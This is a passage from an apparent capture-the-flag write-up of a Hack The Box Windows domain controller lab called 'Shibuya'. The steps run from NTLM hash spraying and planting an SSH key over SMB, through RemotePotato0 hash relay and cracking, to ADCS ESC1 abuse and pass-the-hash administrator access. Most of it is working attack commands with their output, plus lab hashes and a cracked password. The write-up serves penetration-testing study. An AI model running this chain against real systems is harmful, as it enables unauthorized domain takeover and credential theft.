+[*] Cleaning up...</code></pre><p>Ive dumped the hashes of some users</p><p>The hash for the administrator does not work</p><p>The hash for the <code>operator</code> does not work</p><p>Ill put all these hashes into a file</p><h2>Spraying NTLM hashes</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb AWSJPDC0522.shibuya.vl -u users.txt -H &#39;hashes.txt&#39; --continue-on-success
+
+SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\Simon.Watson:5d8c3d1a20bd63f60f469f6763ca0d50</code></pre><p>Found that the hash for the operator is the hash for <code>simon.watson</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb AWSJPDC0522.shibuya.vl -u simon.watson -H &#39;5d8c3d1a20bd63f60f469f6763ca0d50&#39; --shares
+SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\simon.watson:5d8c3d1a20bd63f60f469f6763ca0d50 
+SMB         10.129.234.42   445    AWSJPDC0522      [*] Enumerated shares
+SMB         10.129.234.42   445    AWSJPDC0522      Share           Permissions     Remark
+SMB         10.129.234.42   445    AWSJPDC0522      -----           -----------     ------
+SMB         10.129.234.42   445    AWSJPDC0522      ADMIN$                          Remote Admin
+SMB         10.129.234.42   445    AWSJPDC0522      C$                              Default share
+SMB         10.129.234.42   445    AWSJPDC0522      images$         READ            
+SMB         10.129.234.42   445    AWSJPDC0522      IPC$            READ            Remote IPC
+SMB         10.129.234.42   445    AWSJPDC0522      NETLOGON        READ            Logon server share 
+SMB         10.129.234.42   445    AWSJPDC0522      SYSVOL          READ            Logon server share 
+SMB         10.129.234.42   445    AWSJPDC0522      users           READ </code></pre><p>Since i only have a hash i cant SSH yet</p><p>But i can connect to the <code>users</code> share and add my public key to authorized_keys then SSH in</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">smbclient \\\\AWSJPDC0522.shibuya.vl\\users -U &#39;simon.watson&#39; --pw-nt-hash &#39;5d8c3d1a20bd63f60f469f6763ca0d50&#39; 
+Try &quot;help&quot; to get a list of possible commands.
+smb: \&gt; cd simon.watson
+smb: \simon.watson\&gt; mkdir .ssh
+smb: \simon.watson\&gt; cd .ssh
+smb: \simon.watson\.ssh\&gt; put /home/kali/.ssh/id_ed25519.pub authorized_keys
+putting file /home/kali/.ssh/id_ed25519.pub as \simon.watson\.ssh\authorized_keys (1.9 kB/s) (average 1.2 kB/s)</code></pre><p>Now i should be able to SSH in</p><h2>SSH access as <code>simon.watson</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ssh simon.watson@shibuya.vl -i /home/kali/.ssh/id_ed25519 
+The authenticity of host &#39;shibuya.vl (10.129.234.42)&#39; can&#39;t be established.
+ED25519 key fingerprint is: SHA256:SiXhmjQMScl7eQgH4/uyVXXTsCHM6diy6fh80l4zzJQ
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:22: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#39;shibuya.vl&#39; (ED25519) to the list of known hosts.
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+
+Microsoft Windows [Version 10.0.20348.3453]
+(c) Microsoft Corporation. All rights reserved.
+
+shibuya\simon.watson@AWSJPDC0522 C:\Users\simon.watson&gt;</code></pre><p>I now have access via SSH</p><p>Ill upload sharphound</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">scp -i /home/kali/.ssh/id_ed25519 SharpHound.exe simon.watson@shibuya.vl:/programdata/
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+SharpHound.exe</code></pre><p>This uploaded it to the target</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\simon.watson\Desktop&gt; C:\programdata\SharpHound.exe -c All</code></pre><p>I have now got some data i can upload to bloodhound</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">scp -i /home/kali/.ssh/id_ed25519 simon.watson@shibuya.vl:Desktop/20260321123636_BloodHound.zip .</code></pre><p>This copied the results back to my machine</p><p>Now i can put them into bloodhound</p><h2>Bloodhound</h2><p>The <code>AWSJPDC0522.SHIBUYA.VL</code> machine account has two active sessions, one for simon which is probably my session over SSH and the other is for a user <code>nigel.mills</code></p><p>To exploit this ill upload RunasCs to get the target session ID</p><h2>Compromising <code>nigel.mills</code></h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">scp -i /home/kali/.ssh/id_ed25519 RunasCs.exe simon.watson@shibuya.vl:/programdata/
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+RunasCs.exe                                                                       100%   51KB 949.2KB/s   00:00</code></pre><p>This uploaded it</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\simon.watson\Desktop&gt; C:\programdata\RunasCs.exe user pass qwinsta -l 9 
+
+ SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE
+&gt;services                                    0  Disc
+ rdp-tcp#0         nigel.mills               1  Active
+ console                                     2  Conn
+ rdp-tcp                                 65536  Listen
+PS C:\Users\simon.watson\Desktop&gt;</code></pre><p>Found <code>nigels</code> session ID <code>1</code></p><p>Next step is to upload RemotePotato0</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">scp -i /home/kali/.ssh/id_ed25519 RemotePotato0.exe simon.watson@shibuya.vl:/programdata/
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+RemotePotato0.exe                                                                 100%  173KB   1.3MB/s   00:00</code></pre><p>This uploaded the remotepotato</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:10.129.234.42:8080
+[sudo] password for kali: </code></pre><p>Started a socat listener</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">PS C:\Users\simon.watson\Desktop&gt; C:\programdata\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.90 -p 8080
+[*] Detected a Windows Server version not compatible with JuicyPotato. RogueOxidResolver must be run remotely. Remember to forward tcp port 135 on (null) to your victim machine on port 8080
+[*] Example Network redirector:
+        sudo socat -v TCP-LISTEN:135,fork,reuseaddr TCP:{{ThisMachineIp}}:8080
+[*] Starting the RPC server to capture the credentials hash from the user authentication!!
+[*] RPC relay server listening on port 9997 ...
+[*] Spawning COM object in the session: 1
+[*] Calling StandardGetInstanceFromIStorage with CLSID:{5167B42F-C111-47A1-ACC4-8EABE61B0B54}
+[*] Starting RogueOxidResolver RPC Server listening on port 8080 ... 
+[*] IStoragetrigger written: 104 bytes
+[*] ServerAlive2 RPC Call
+[*] ResolveOxid2 RPC call
+[+] Received the relayed authentication on the RPC relay server on port 9997
+[*] Connected to RPC Server 127.0.0.1 on port 8080
+[+] User hash stolen!
+
+NTLMv2 Client   : AWSJPDC0522
+NTLMv2 Username : SHIBUYA\Nigel.Mills
+NTLMv2 Hash     : Nigel.Mills::SHIBUYA:79335a02a3610233:c4023f4f08e613333affe042c375ac0f:0101000000000000945b690e6db9dc0171134e5e2ddb29b20000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c0007000800945b690e6db9dc0106000400060000000800300030000000000000000100000000200000c8bdde354ca45207e5b37c05c429a0770976a5c302a5443bc4777564440fe6040a00100000000000000000000000000000000000090000000000000000000000</code></pre><h3>Cracking the hash</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat nigelmills.hash /usr/share/wordlists/rockyou.txt
+
+NIGEL.MILLS::SHIBUYA:79335a02a3610233:c4023f4f08e613333affe042c375ac0f:0101000000000000945b690e6db9dc0171134e5e2ddb29b20000000002000e005300480049004200550059004100010016004100570053004a0050004400430030003500320032000400140073006800690062007500790061002e0076006c0003002c004100570053004a0050004400430030003500320032002e0073006800690062007500790061002e0076006c000500140073006800690062007500790061002e0076006c0007000800945b690e6db9dc0106000400060000000800300030000000000000000100000000200000c8bdde354ca45207e5b37c05c429a0770976a5c302a5443bc4777564440fe6040a00100000000000000000000000000000000000090000000000000000000000:Sail2Boat3</code></pre><p>I can now test these creds</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb AWSJPDC0522.shibuya.vl -u &#39;nigel.mills&#39; -p &#39;Sail2Boat3&#39;   
+SMB         10.129.234.42   445    AWSJPDC0522      [*] Windows Server 2022 Build 20348 x64 (name:AWSJPDC0522) (domain:shibuya.vl) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.234.42   445    AWSJPDC0522      [+] shibuya.vl\nigel.mills:Sail2Boat3</code></pre><p>This user has now been compromised</p><h2>Domain admin via ESC1</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ssh nigel.mills@shibuya.vl -D 1080            
+** WARNING: connection is not using a post-quantum key exchange algorithm.
+** This session may be vulnerable to &quot;store now, decrypt later&quot; attacks.
+** The server may need to be upgraded. See https://openssh.com/pq.html
+nigel.mills@shibuya.vl&#39;s password: 
+
+Microsoft Windows [Version 10.0.20348.3453]
+(c) Microsoft Corporation. All rights reserved.
+
+shibuya\nigel.mills@AWSJPDC0522 C:\Users\nigel.mills&gt;</code></pre><p>Ive logged into SSH as this user using a socks proxy</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">socks5  127.0.0.1 1080</code></pre><p>Ive added the port from the socks proxy to <code>/etc/proxychains.conf</code></p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">proxychains certipy-ad find -u nigel.mills@shibuya.vl -p &#39;Sail2Boat3&#39; -dc-ip 10.129.234.42 -vulnerable -stdout
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:636  ...  OK
+[*] Finding certificate templates
+[*] Found 34 certificate templates
+[*] Finding certificate authorities
+[*] Found 1 certificate authority
+[*] Found 12 enabled certificate templates
+[*] Finding issuance policies
+[*] Found 15 issuance policies
+[*] Found 0 OIDs linked to templates
+[*] Retrieving CA configuration for &#39;shibuya-AWSJPDC0522-CA&#39; via RRP
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:445  ...  OK
+[!] Failed to connect to remote registry. Service should be starting now. Trying again...
+[*] Successfully retrieved CA configuration for &#39;shibuya-AWSJPDC0522-CA&#39;
+[*] Checking web enrollment for CA &#39;shibuya-AWSJPDC0522-CA&#39; @ &#39;AWSJPDC0522.shibuya.vl&#39;
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:80  ...  OK
+[!] Error checking web enrollment: Server disconnected without sending a response.
+[!] Use -debug to print a stacktrace
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:443  ...  OK
+[!] Error checking web enrollment: [SSL: UNEXPECTED_EOF_WHILE_READING] EOF occurred in violation of protocol (_ssl.c:1033)
+[!] Use -debug to print a stacktrace
+[*] Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : shibuya-AWSJPDC0522-CA
+    DNS Name                            : AWSJPDC0522.shibuya.vl
+    Certificate Subject                 : CN=shibuya-AWSJPDC0522-CA, DC=shibuya, DC=vl
+    Certificate Serial Number           : 2417712CBD96C58449CFDA3BE3987F52
+    Certificate Validity Start          : 2025-02-15 07:24:14+00:00
+    Certificate Validity End            : 2125-02-15 07:34:13+00:00
+    Web Enrollment
+      HTTP
+        Enabled                         : False
+      HTTPS
+        Enabled                         : False
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption for Requests     : Enabled
+    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
+    Permissions
+      Owner                             : SHIBUYA.VL\Administrators
+      Access Rights
+        ManageCa                        : SHIBUYA.VL\Administrators
+                                          SHIBUYA.VL\Domain Admins
+                                          SHIBUYA.VL\Enterprise Admins
+        ManageCertificates              : SHIBUYA.VL\Administrators
+                                          SHIBUYA.VL\Domain Admins
+                                          SHIBUYA.VL\Enterprise Admins
+        Enroll                          : SHIBUYA.VL\Authenticated Users
+Certificate Templates
+  0
+    Template Name                       : ShibuyaWeb
+    Display Name                        : ShibuyaWeb
+    Certificate Authorities             : shibuya-AWSJPDC0522-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : True
+    Any Purpose                         : True
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Private Key Flag                    : ExportableKey
+    Extended Key Usage                  : Any Purpose
+                                          Server Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Schema Version                      : 2
+    Validity Period                     : 100 years
+    Renewal Period                      : 75 years
+    Minimum RSA Key Length              : 4096
+    Template Created                    : 2025-02-15T07:37:49+00:00
+    Template Last Modified              : 2025-02-19T10:58:41+00:00
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : SHIBUYA.VL\t1_admins
+                                          SHIBUYA.VL\Domain Admins
+                                          SHIBUYA.VL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : SHIBUYA.VL\_admin
+        Full Control Principals         : SHIBUYA.VL\Domain Admins
+                                          SHIBUYA.VL\Enterprise Admins
+        Write Owner Principals          : SHIBUYA.VL\Domain Admins
+                                          SHIBUYA.VL\Enterprise Admins
+        Write Dacl Principals           : SHIBUYA.VL\Domain Admins
+                                          SHIBUYA.VL\Enterprise Admins
+        Write Property Enroll           : SHIBUYA.VL\Domain Admins
+                                          SHIBUYA.VL\Enterprise Admins
+    [+] User Enrollable Principals      : SHIBUYA.VL\t1_admins
+    [!] Vulnerabilities
+      ESC1                              : Enrollee supplies subject and template allows client authentication.
+      ESC2                              : Template can be used for any purpose.
+      ESC3                              : Template has Certificate Request Agent EKU set.</code></pre><p>As seen here is is vulnerable to ESC1 and others as well but since ESC1 is the simplest ill chose that one</p><h3>ESC1</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">proxychains certipy-ad account -u &#39;nigel.mills&#39; -p &#39;Sail2Boat3&#39; -dc-ip &#39;10.129.234.42&#39; -user &#39;_admin&#39; read       
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  10.129.234.42:636  ...  OK
+[*] Reading attributes for &#39;_admin&#39;:
+    cn                                  : _admin
+    distinguishedName                   : CN=_admin,CN=Users,DC=shibuya,DC=vl
+    name                                : _admin
+    objectSid                           : S-1-5-21-87560095-894484815-3652015022-500
+    sAMAccountName                      : _admin
+    userAccountControl                  : 66048
+    whenCreated                         : 2025-02-15T07:24:21+00:00
+    whenChanged                         : 2025-05-07T09:26:52+00:00</code></pre><p>I first grabbed the admins SID</p><p>Now i will comment out the entry in <code>/etc/hosts</code> and add <code>AWSJPDC0522.shibuya.vl</code> to the <code>127.0.0.1</code> line so that it resolves to my localhost where the proxy is</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">proxychains certipy-ad req -u &#39;nigel.mills&#39; -p &#39;Sail2Boat3&#39; -dc-ip &#39;127.0.0.1&#39; -target &#39;AWSJPDC0522.shibuya.vl&#39; -ca &#39;shibuya-AWSJPDC0522-CA&#39; -template &#39;ShibuyaWeb&#39; -upn &#39;_admin@shibuya.vl&#39; -sid &#39;S-1-5-21-87560095-894484815-3652015022-500&#39; -key-size 4096 -debug
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[+] Nameserver: &#39;127.0.0.1&#39;
+[+] DC IP: &#39;127.0.0.1&#39;
+[+] DC Host: None
+[+] Target IP: None
+[+] Remote Name: &#39;AWSJPDC0522.shibuya.vl&#39;
+[+] Domain: &#39;&#39;
+[+] Username: &#39;NIGEL.MILLS&#39;
+[+] Trying to resolve &#39;AWSJPDC0522.shibuya.vl&#39; at &#39;127.0.0.1&#39;
+[!] DNS resolution failed: The resolution lifetime expired after 5.404 seconds: Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.
+Traceback (most recent call last):
+  File &quot;/usr/lib/python3/dist-packages/certipy/lib/target.py&quot;, line 442, in resolve
+    answers = self.resolver.resolve(hostname, tcp=self.use_tcp)
+  File &quot;/usr/lib/python3/dist-packages/dns/resolver.py&quot;, line 1320, in resolve
+    timeout = self._compute_timeout(start, lifetime, resolution.errors)
+  File &quot;/usr/lib/python3/dist-packages/dns/resolver.py&quot;, line 1076, in _compute_timeout
+    raise LifetimeTimeout(timeout=duration, errors=errors)
+dns.resolver.LifetimeTimeout: The resolution lifetime expired after 5.404 seconds: Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.; Server Do53:127.0.0.1@53 answered The DNS operation timed out.
+[+] Generating RSA key
+[*] Requesting certificate via RPC
+[+] Trying to connect to endpoint: ncacn_np:224.0.0.1[\pipe\cert]
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  AWSJPDC0522.shibuya.vl:445  ...  OK
+[+] Connected to endpoint: ncacn_np:224.0.0.1[\pipe\cert]
+[*] Request ID is 9
+[*] Successfully requested certificate
+[*] Got certificate with UPN &#39;_admin@shibuya.vl&#39;
+[+] Found SID in SAN URL: &#39;S-1-5-21-87560095-894484815-3652015022-500&#39;
+[+] Found SID in security extension: &#39;S-1-5-21-87560095-894484815-3652015022-500&#39;
+[*] Certificate object SID is &#39;S-1-5-21-87560095-894484815-3652015022-500&#39;
+[*] Saving certificate and private key to &#39;_admin.pfx&#39;
+[+] Attempting to write data to &#39;_admin.pfx&#39;
+[+] Data written to &#39;_admin.pfx&#39;
+[*] Wrote certificate and private key to &#39;_admin.pfx&#39;</code></pre><p>Ive saved the .pfx</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">proxychains certipy-ad auth -pfx _admin.pfx -dc-ip 127.0.0.1 
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+Certipy v5.0.4 - by Oliver Lyak (ly4k)
+
+[*] Certificate identities:
+[*]     SAN UPN: &#39;_admin@shibuya.vl&#39;
+[*]     SAN URL SID: &#39;S-1-5-21-87560095-894484815-3652015022-500&#39;
+[*]     Security Extension SID: &#39;S-1-5-21-87560095-894484815-3652015022-500&#39;
+[*] Using principal: &#39;_admin@shibuya.vl&#39;
+[*] Trying to get TGT...
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
+[*] Got TGT
+[*] Saving credential cache to &#39;_admin.ccache&#39;
+[*] Wrote credential cache to &#39;_admin.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;_admin&#39;
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:88  ...  OK
+[*] Got hash for &#39;_admin@shibuya.vl&#39;: aad3b435b51404eeaad3b435b51404ee:bab5b2a004eabb11d865f31912b6b430</code></pre><p>Now i can try and login as the administrator</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">proxychains evil-winrm -i AWSJPDC0522.shibuya.vl -u _admin -H &#39;bab5b2a004eabb11d865f31912b6b430&#39;
+[proxychains] config file found: /etc/proxychains4.conf
+[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
+[proxychains] DLL init: proxychains-ng 4.17
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  AWSJPDC0522.shibuya.vl:5985  ...  OK
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; dir
+
+
+    Directory: C:\Users\Administrator\Desktop
+
+
+Mode                 LastWriteTime         Length Name
+----                 -------------         ------ ----
+-a----         2/16/2025   2:34 AM           2304 Microsoft Edge.lnk
+-a----          4/8/2025   5:05 PM             32 root.txt
+
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami /priv
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  AWSJPDC0522.shibuya.vl:5985  ...  OK
+[proxychains] Strict chain  ...  127.0.0.1:1080  ...  AWSJPDC0522.shibuya.vl:5985  ...  OK
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; </code></pre><p>Full domain compromise!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-voleur/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Voleur</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-bruno/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Bruno</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
